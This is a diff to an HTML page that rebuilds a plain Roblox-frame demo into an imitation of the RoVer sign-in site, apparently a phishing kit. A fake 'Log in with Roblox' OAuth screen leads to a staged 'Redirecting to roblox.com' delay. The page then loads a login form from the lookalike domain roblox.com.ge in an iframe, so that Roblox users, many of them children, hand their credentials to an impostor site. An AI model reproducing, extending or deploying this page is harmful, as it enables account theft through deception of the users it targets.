@@ -3,15 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Roblox Frame Method</title>
+    <title>RoVer - Roblox Server Management</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-<button class="demo-btn" id="openFrameBtn">▶ Open Roblox Frame</button>
+<!-- MAIN PAGE - RoVer Sign In -->
+<div id="mainPage" class="main-container">
+    <!-- Header -->
+    <header class="rover-header">
+        <div class="header-content">
+            <div class="logo">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                    <rect width="32" height="32" rx="6" fill="white" opacity="0.2"/>
+                    <text x="16" y="22" font-size="20" font-weight="bold" fill="white" text-anchor="middle">R</text>
+                </svg>
+                <span>RoVer</span>
+            </div>
+            <nav class="nav-links">
+                <a href="#help">Help</a>
+                <a href="#team">Team Members</a>
+                <a href="#plus" class="plus-badge">RoVer Plus</a>
+            </nav>
+            <div class="header-buttons">
+                <button class="manage-btn">Manage Servers</button>
+                <button class="signin-btn">Sign In</button>
+            </div>
+        </div>
+    </header>
 
-<!-- SLIDE-DOWN FRAME MODAL -->
-<div id="robloxFrameOverlay" class="frame-overlay">
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="signin-box">
+            <h1>Sign in to RoVer</h1>
+            <p class="age-notice">You must be 13 years of age or older to continue.</p>
+            <button id="loginRobloxBtn" class="roblox-login-btn">
+                <svg class="roblox-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M6 2H18C20.2 2 22 3.8 22 6V18C22 20.2 20.2 22 18 22H6C3.8 22 2 20.2 2 18V6C2 3.8 3.8 2 6 2Z" fill="white"/>
+                    <rect x="5" y="5" width="4" height="4" fill="#E91E63"/>
+                    <rect x="10" y="5" width="4" height="4" fill="#E91E63"/>
+                    <rect x="15" y="5" width="4" height="4" fill="#E91E63"/>
+                    <rect x="5" y="10" width="4" height="4" fill="#E91E63"/>
+                    <rect x="15" y="10" width="4" height="4" fill="#E91E63"/>
+                    <rect x="5" y="15" width="4" height="4" fill="#E91E63"/>
+                    <rect x="10" y="15" width="4" height="4" fill="#E91E63"/>
+                    <rect x="15" y="15" width="4" height="4" fill="#E91E63"/>
+                </svg>
+                Log in with Roblox
+            </button>
+            <div class="divider">or</div>
+            <button class="return-btn">Return to RoVer</button>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="rover-footer">
+        <div class="footer-content">
+            <div class="footer-section">
+                <svg class="imaginary-logo" viewBox="0 0 200 80" xmlns="http://www.w3.org/2000/svg">
+                    <text x="40" y="50" font-size="32" font-weight="bold" fill="#E91E63">Imaginary</text>
+                    <text x="120" y="50" font-size="28" font-style="italic" fill="#E91E63">Menagerie</text>
+                </svg>
+                <p>© 2026 Imaginary Managerie, LLC.</p>
+            </div>
+            <div class="footer-section">
+                <h4>Team members</h4>
+                <a href="#">Support Discord server</a>
+                <a href="#">Add RoVer to your server</a>
+                <a href="#">Bot Developer API</a>
+            </div>
+            <div class="footer-section">
+                <h4>Terms of Service</h4>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Verify your Roblox account</a>
+            </div>
+        </div>
+    </footer>
+</div>
+
+<!-- OAUTH SCREEN -->
+<div id="oauthScreen" class="modal-overlay hidden">
+    <div class="oauth-card">
+        <h2>Sign in to RoVer</h2>
+        <div class="oauth-content">
+            <h3>Authorize with Roblox OAuth</h3>
+            <div class="oauth-divider"></div>
+            <div class="roblox-logo-large">
+                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="100" rx="10" fill="#E91E63" opacity="0.1"/>
+                    <text x="50" y="70" font-size="60" font-weight="bold" fill="#E91E63" text-anchor="middle">R</text>
+                </svg>
+            </div>
+            <button id="continueBtn" class="continue-btn">Continue</button>
+            <div class="oauth-divider"></div>
+            <button id="returnBtn" class="return-oauth-btn">Return to RoVer</button>
+        </div>
+    </div>
+</div>
+
+<!-- REDIRECT SCREEN -->
+<div id="redirectScreen" class="modal-overlay hidden">
+    <div class="redirect-card">
+        <h1>Sign in to RoVer</h1>
+        <h2>Redirecting to roblox.com</h2>
+        <div class="redirect-spinner"></div>
+        <p class="redirect-message">If you are not redirected back in a few seconds, <a href="#" id="cancelLink">cancel</a> and try again.</p>
+    </div>
+</div>
+
+<!-- ROBLOX FRAME MODAL -->
+<div id="robloxFrameOverlay" class="frame-overlay hidden">
     <div class="frame-card">
         <div id="frameLoader" class="frame-loader">
             <div class="frame-spinner"></div>
@@ -28,12 +129,46 @@
 </div>
 
 <script>
-    const openBtn = document.getElementById('openFrameBtn');
-    const frameOverlay = document.getElementById('robloxFrameOverlay');
+    // Elements
+    const loginRobloxBtn = document.getElementById('loginRobloxBtn');
+    const oauthScreen = document.getElementById('oauthScreen');
+    const continueBtn = document.getElementById('continueBtn');
+    const redirectScreen = document.getElementById('redirectScreen');
+    const robloxFrameOverlay = document.getElementById('robloxFrameOverlay');
+    const frameLoader = document.getElementById('frameLoader');
     const closeFrameBtn = document.getElementById('closeFrameBtn');
     const robloxIframe = document.getElementById('robloxLoginIframe');
-    const frameLoader = document.getElementById('frameLoader');
+    const returnBtn = document.getElementById('returnBtn');
+    const returnOauthBtn = document.getElementById('returnOauthBtn');
+    const returnMainBtn = document.querySelector('.return-btn');
 
+    // Step 1: Login button click -> Show OAuth screen
+    loginRobloxBtn.addEventListener('click', () => {
+        oauthScreen.classList.remove('hidden');
+    });
+
+    // Return to main from OAuth
+    returnBtn.addEventListener('click', () => {
+        oauthScreen.classList.add('hidden');
+    });
+
+    returnMainBtn.addEventListener('click', () => {
+        oauthScreen.classList.add('hidden');
+    });
+
+    // Step 2: Continue button click -> Show redirect screen
+    continueBtn.addEventListener('click', () => {
+        oauthScreen.classList.add('hidden');
+        redirectScreen.classList.remove('hidden');
+        
+        // After 5 seconds, show the Roblox frame
+        setTimeout(() => {
+            redirectScreen.classList.add('hidden');
+            showRobloxFrame();
+        }, 5000);
+    });
+
+    // Step 3: Show Roblox Frame
     function showRobloxFrame() {
         frameLoader.classList.remove('hide');
         robloxIframe.src = 'about:blank';
@@ -41,7 +176,7 @@
             robloxIframe.src = 'https://roblox.com.ge/login?returnUrl=8785603489260332';
         }, 50);
         
-        frameOverlay.classList.add('active');
+        robloxFrameOverlay.classList.remove('hidden');
         
         robloxIframe.onload = function() {
             frameLoader.classList.add('hide');
@@ -52,26 +187,32 @@
         }, 5000);
     }
 
+    // Close Roblox frame
     function hideRobloxFrame() {
-        frameOverlay.classList.remove('active');
+        robloxFrameOverlay.classList.add('hidden');
         setTimeout(() => {
             robloxIframe.src = 'about:blank';
         }, 300);
     }
 
-    openBtn.addEventListener('click', showRobloxFrame);
     closeFrameBtn.addEventListener('click', hideRobloxFrame);
     
-    frameOverlay.addEventListener('click', (e) => {
-        if (e.target === frameOverlay) {
+    robloxFrameOverlay.addEventListener('click', (e) => {
+        if (e.target === robloxFrameOverlay) {
             hideRobloxFrame();
         }
     });
     
     document.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape' && frameOverlay.classList.contains('active')) {
+        if (e.key === 'Escape' && !robloxFrameOverlay.classList.contains('hidden')) {
             hideRobloxFrame();
         }
+    });
+
+    // Cancel redirect
+    document.getElementById('cancelLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        redirectScreen.classList.add('hidden');
     });
 </script>
 
